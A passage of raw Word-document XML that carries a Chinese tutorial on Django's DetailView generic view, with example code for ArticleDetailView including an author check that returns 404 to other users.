    </w:p>
    <w:p w14:paraId="20BA47B5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="144CA672"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40396857" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      path('blog/', views.IndexView.as_view(), name='index'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F18485C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476AA28E" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60EAFB20" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django通用视图之DetailView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B0D6CA" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DetailView用来展示一个具体对象的详细信息。它需要URL提供访问某个对象的具体参数（如pk, slug值）。本例中用来展示某篇文章详细内容的view可以简写为:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040F7EF8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0463738B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic import DetailView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C46AE0B"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4800BE47" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48CE503A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleDetailView(DetailView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F802ED5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="013B6F17" w14:textId="02780223"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682CC6E4" w14:textId="40AB2872" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18D70BEC" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DetailView默认的模板是app/model_name_detail.html, 默认的内容对象名字context_object_name是model_name。本例中默认模板是blog/article_detail.html, 默认对象名字是article, 在模板里可通过 {{ article.title }}获取文章标题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF11037" w14:textId="602183D8" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1707B94B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你同样可以通过重写queryset, template_name和context_object_name来完成DetailView的自定义。你还可以通过重写get_context_data方法传递额外的参数或内容。如果你指定了queryset, 那么返回的object是queryset.get(pk = id), 而不是model.objects.get(pk = id)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5753D9C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E8D4A7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic import ListView，DetailView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FC6654"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1C5219A0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.utils import timezone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDDFF49" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="530EAB60" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleDetailView(DetailView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF1F614" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7631400D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    queryset = Article.objects.all().order_by("-pub_date") # </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA68929" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    template_name = 'blog/article_detail.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305D3D86" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    context_object_name = 'article'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275C4386" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AB797F8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_context_data(self, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF7943F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        context = super().get_context_data(**kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6548E02F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        context['now'] = timezone.now()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5C2546" w14:textId="66FF255A" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return context</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500EBCA7" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在实际应用中，上述代码可能还不能满足你的要求。比如你希望一个用户只能看到自己发表的文章详情。当用户查看别人的文章详情时，返回http 404错误。这时候你可以通过更具体的get_object()方法来返回一个更具体的对象。代码如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFE7278" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5C1CF2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic import DetailView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E5C771" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import Http404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E302D12"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4639900C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.utils import timezone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FF7802" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C422ECC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleDetailView(DetailView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D574FE6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0140C7B9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    queryset = Article.objects.all().order_by("-pub_date")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7DCA97"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'blog/article_detail.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1405BD28" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    context_object_name = 'article'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E6DF77D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EBC22D4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_object(self, queryset=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B74B27" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        obj = super().get_object(queryset=queryset)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB49291" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if obj.author != self.request.user:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D556764" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise Http404()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2AA40F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return obj</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0570EF45" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54A23499" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_context_data(self, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4944FECC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        context = super().get_context_data(**kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675EE85B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        context['now'] = timezone.now()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606844C8" w14:textId="76EFC4D4" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return context</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B239F00" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django通用视图之CreateView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40977D85" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
